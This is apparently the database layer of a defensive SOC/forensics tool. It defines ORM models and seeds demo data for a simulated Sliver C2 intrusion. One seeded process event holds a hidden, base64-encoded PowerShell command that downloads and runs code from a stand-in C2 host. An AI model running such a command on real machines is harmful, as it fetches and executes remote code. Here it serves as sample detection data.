"""
core/db.py — SQLite Database and ORM Layer
============================================
Handles persistent storage for forensic events, security alerts,
IOC intelligence cache, incident cases, and analyst assignments.
"""

import os
import datetime
import json
from typing import List, Dict, Any, Optional

from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text, ForeignKey, Table
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship

import config

Base = declarative_base()

# ── ORM Models ─────────────────────────────────────────────────────────────────

class Event(Base):
    __tablename__ = "events"

    id = Column(Integer, primary_key=True, autoincrement=True)
    timestamp = Column(DateTime, default=datetime.datetime.utcnow)
    event_type = Column(String(50), nullable=False) # Browser, Network, Process, File, USB, Memory
    title = Column(String(200))
    url_or_path = Column(String(500))
    details = Column(Text)
    severity = Column(String(20), default="LOW")
    matched_rule = Column(String(100), default="NONE")
    threat_score = Column(Integer, default=0)
    
    # Network fields
    src_ip = Column(String(45))
    dst_ip = Column(String(45))
    dst_port = Column(String(10))
    host = Column(String(200))
    protocol = Column(String(20))
    
    # Process / EDR fields
    process_name = Column(String(100))
    process_id = Column(Integer)
    parent_process_id = Column(Integer)
    cmdline = Column(Text)
    
    # Source metadata
    source = Column(String(50), default="EDR")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "visit_time": self.timestamp.strftime("%Y-%m-%d %H:%M:%S") if self.timestamp else "",
            "event_type": self.event_type,
            "title": self.title,
            "url": self.url_or_path,
            "details": self.details,
            "severity": self.severity,
            "matched_rule": self.matched_rule,
            "threat_score": self.threat_score,
            "src_ip": self.src_ip,
            "dst_ip": self.dst_ip,
            "dst_port": self.dst_port,
            "domain": self.host,
            "protocol": self.protocol,
            "process_name": self.process_name,
            "process_id": self.process_id,
            "parent_process_id": self.parent_process_id,
            "cmdline": self.cmdline,
            "source": self.source
        }


class Alert(Base):
    __tablename__ = "alerts"

    id = Column(Integer, primary_key=True, autoincrement=True)
    timestamp = Column(DateTime, default=datetime.datetime.utcnow)
    rule_name = Column(String(100), nullable=False)
    severity = Column(String(20), nullable=False)
    status = Column(String(50), default="Active") # Active, Suppressed, Resolved
    details = Column(Text)
    
    # Relation to source event
    event_id = Column(Integer, ForeignKey("events.id"), nullable=True)
    event = relationship("Event")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "timestamp": self.timestamp.strftime("%Y-%m-%d %H:%M:%S") if self.timestamp else "",
            "rule_name": self.rule_name,
            "severity": self.severity,
            "status": self.status,
            "details": self.details,
            "event": self.event.to_dict() if self.event else None
        }


class IOC(Base):
    __tablename__ = "iocs"

    id = Column(Integer, primary_key=True, autoincrement=True)
    value = Column(String(256), unique=True, nullable=False)
    type = Column(String(50), nullable=False) # IP, URL, Domain, SHA256, MD5, Email
    severity = Column(String(20), default="LOW")
    malware_family = Column(String(100), default="Unknown")
    reputation_score = Column(Integer, default=0) # 0-100
    lookup_source = Column(String(50), default="Static")
    last_seen = Column(DateTime, default=datetime.datetime.utcnow)
    details = Column(Text)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "value": self.value,
            "type": self.type,
            "severity": self.severity,
            "malware_family": self.malware_family,
            "reputation_score": self.reputation_score,
            "lookup_source": self.lookup_source,
            "last_seen": self.last_seen.strftime("%Y-%m-%d %H:%M:%S") if self.last_seen else "",
            "details": self.details
        }


class Incident(Base):
    __tablename__ = "incidents"

    id = Column(Integer, primary_key=True, autoincrement=True)
    case_name = Column(String(200), nullable=False)
    status = Column(String(50), default="Open") # Open -> Investigating -> Contained -> Resolved
    analyst_name = Column(String(100), default="Unassigned")
    created_at = Column(DateTime, default=datetime.datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)
    description = Column(Text)
    notes = Column(Text) # JSON string array of analyst comments
    associated_events = Column(Text) # Comma-separated list of event IDs
    severity = Column(String(20), default="MEDIUM")

    def get_notes(self) -> List[Dict[str, str]]:
        if not self.notes:
            return []
        try:
            return json.loads(self.notes)
        except Exception:
            return [{"time": self.created_at.strftime("%Y-%m-%d %H:%M"), "author": "System", "text": self.notes}]

    def set_notes(self, notes_list: List[Dict[str, str]]):
        self.notes = json.dumps(notes_list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "case_name": self.case_name,
            "status": self.status,
            "analyst_name": self.analyst_name,
            "created_at": self.created_at.strftime("%Y-%m-%d %H:%M:%S") if self.created_at else "",
            "updated_at": self.updated_at.strftime("%Y-%m-%d %H:%M:%S") if self.updated_at else "",
            "description": self.description,
            "notes": self.get_notes(),
            "associated_events": [int(eid) for eid in self.associated_events.split(",")] if self.associated_events else [],
            "severity": self.severity
        }


class Analyst(Base):
    __tablename__ = "analysts"

    id = Column(Integer, primary_key=True, autoincrement=True)
    name = Column(String(100), nullable=False)
    email = Column(String(100))
    role = Column(String(50), default="SOC Analyst")


# ── Session & Engine setup ─────────────────────────────────────────────────────

_engine = None
_Session = None

def init_db(db_url: str = None) -> Any:
    """Initialize SQLite database and create tables if they do not exist."""
    global _engine, _Session
    url = db_url or config.DB_URL
    
    # Ensure database directory exists
    db_dir = os.path.dirname(config.DB_FILE)
    if db_dir:
        os.makedirs(db_dir, exist_ok=True)
        
    _engine = create_engine(url, connect_args={"check_same_thread": False})
    Base.metadata.create_all(_engine)
    _Session = sessionmaker(bind=_engine)
    
    # Seed demo data if database is empty
    seed_demo_data()
    return _engine

def get_session():
    """Retrieve standard db session."""
    global _Session
    if _Session is None:
        init_db()
    return _Session()


# ── Seeding & Demo Data ────────────────────────────────────────────────────────

def seed_demo_data():
    """Seed initial lookup entities, events, alerts, and cases if db is empty."""
    session = _Session()
    
    # Check if we already have analysts
    if session.query(Analyst).count() > 0:
        session.close()
        return

    print("[DATABASE] Database is empty. Seeding rich SOC demo data...")
    
    # 1. Add analysts
    analysts = [
        Analyst(name="Wasay SOC Officer", email="wasay@dfir.sentinel", role="Lead Threat Hunter"),
        Analyst(name="Sarah Connor", email="sconnor@dfir.sentinel", role="Incident Responder"),
        Analyst(name="John Doe", email="jdoe@dfir.sentinel", role="SOC L1 Analyst")
    ]
    session.add_all(analysts)
    session.commit()
    
    # 2. Add baseline events
    now = datetime.datetime.utcnow()
    events = [
        Event(
            event_type="Browser",
            title="Sliver C2 Payload Download",
            url_or_path="https://malware-drop.xyz/sliver_beacon.exe",
            details="User visited suspicious download link. Browser completed download of sliver_beacon.exe.",
            severity="HIGH",
            matched_rule="DOWNLOAD_DETECTED",
            threat_score=85,
            host="malware-drop.xyz",
            source="chrome_history",
            timestamp=now - datetime.timedelta(minutes=45)
        ),
        Event(
            event_type="Process",
            title="Suspicious cmd.exe spawning powershell.exe",
            url_or_path="C:\\Windows\\System32\\powershell.exe",
            details="Process execution block matching MITRE T1059: Command injection.",
            severity="HIGH",
            matched_rule="POWERSHELL_SUSPICIOUS_ARGS",
            threat_score=90,
            process_name="powershell.exe",
            process_id=4524,
            parent_process_id=1024,
            cmdline="powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC1jMi5vbmlvbi9iZWFjb24nKQ==",
            source="process_monitor",
            timestamp=now - datetime.timedelta(minutes=43)
        ),
        Event(
            event_type="Network",
            title="Active outbound TCP beaconing to .onion C2",
            url_or_path="net://evil-c2.onion:4444",
            details="Repeated TCP connections to high port 4444. Beaconing detected.",
            severity="HIGH",
            matched_rule="BEACONING_TCP_HIGH_PORT",
            threat_score=95,
            src_ip="192.168.0.143",
            dst_ip="185.220.101.4",
            dst_port="4444",
            host="evil-c2.onion",
            protocol="TCP",
            source="tshark",
            timestamp=now - datetime.timedelta(minutes=40)
        ),
        Event(
            event_type="Memory",
            title="Volatility hidden process injection in lsass.exe",
            url_or_path="windows.malfind",
            details="Memory anomaly detected in lsass.exe (PID 688). VAD tag PAGE_EXECUTE_READWRITE marked.",
            severity="HIGH",
            matched_rule="PROCESS_INJECTION_MALFIND",
            threat_score=98,
            process_name="lsass.exe",
            process_id=688,
            source="volatility",
            timestamp=now - datetime.timedelta(minutes=38)
        ),
        Event(
            event_type="USB",
            title="USB Mass Storage Insertion",
            url_or_path="USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler",
            details="USB Drive 'Kingston DataTraveler' inserted into machine endpoint.",
            severity="MEDIUM",
            matched_rule="USB_INSERTION",
            threat_score=40,
            source="usb_monitor",
            timestamp=now - datetime.timedelta(hours=2)
        )
    ]
    session.add_all(events)
    session.commit()
    
    # 3. Add alerts triggered by events
    alerts = [
        Alert(
            rule_name="SIGMA_CREDENTIAL_DUMP",
            severity="HIGH",
            status="Active",
            details="Sigma pattern: lsass.exe memory dumped via PowerShell.",
            event_id=events[1].id,
            timestamp=now - datetime.timedelta(minutes=43)
        ),
        Alert(
            rule_name="BEACONING_TCP_HIGH_PORT",
            severity="CRITICAL",
            status="Active",
            details="Real-time Network C2 detected contacting malicious external server.",
            event_id=events[2].id,
            timestamp=now - datetime.timedelta(minutes=40)
        ),
        Alert(
            rule_name="YARA_SLIVER_IMPLANT",
            severity="CRITICAL",
            status="Active",
            details="YARA scanning detected a match for Sliver Implant in lsass.exe virtual memory space.",
            event_id=events[3].id,
            timestamp=now - datetime.timedelta(minutes=38)
        )
    ]
    session.add_all(alerts)
    session.commit()

    # 4. Add threat intelligence caching (IOCs)
    iocs = [
        IOC(
            value="malware-drop.xyz",
            type="Domain",
            severity="HIGH",
            malware_family="Sliver Beacon Dropper",
            reputation_score=88,
            lookup_source="VirusTotal",
            details="Associated with malware delivery streams hosting Sliver implants."
        ),
        IOC(
            value="185.220.101.4",
            type="IP",
            severity="HIGH",
            malware_family="Tor Exit Node C2",
            reputation_score=94,
            lookup_source="AbuseIPDB",
            details="IP identified as Tor Exit node actively sending brute-force/beaconing commands."
        ),
        IOC(
            value="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            type="SHA256",
            severity="HIGH",
            malware_family="Sliver C2 EXE",
            reputation_score=99,
            lookup_source="VirusTotal",
            details="Compiled sliver implant executing cmd redirection."
        )
    ]
    session.add_all(iocs)
    session.commit()

    # 5. Create active incident case
    incident = Incident(
        case_name="Case Sentinel-2026-001: Automated Sliver C2 Lateral Attack",
        status="Investigating",
        analyst_name="Wasay SOC Officer",
        description="Correlated incident indicating a multi-layered attack chain. User downloaded an active sliver beacon dropper, which spawned PowerShell executing base64-encoded strings, established tor beacon connections on port 4444, and attempted credential dumping by injecting into lsass.exe.",
        associated_events=f"{events[0].id},{events[1].id},{events[2].id},{events[3].id}",
        severity="CRITICAL",
        notes=json.dumps([
            {"time": (now - datetime.timedelta(minutes=30)).strftime("%Y-%m-%d %H:%M"), "author": "System", "text": "Incident Case auto-created by Threat Correlation Engine."},
            {"time": (now - datetime.timedelta(minutes=15)).strftime("%Y-%m-%d %H:%M"), "author": "Wasay SOC Officer", "text": "Isolating endpoint from network space. Acquiring memory image via volatility dump."}
        ])
    )
    session.add(incident)
    session.commit()
    
    session.close()
    print("[DATABASE] Demo data successfully seeded!")

if __name__ == "__main__":
    init_db()
    print("Database Initialized successfully.")
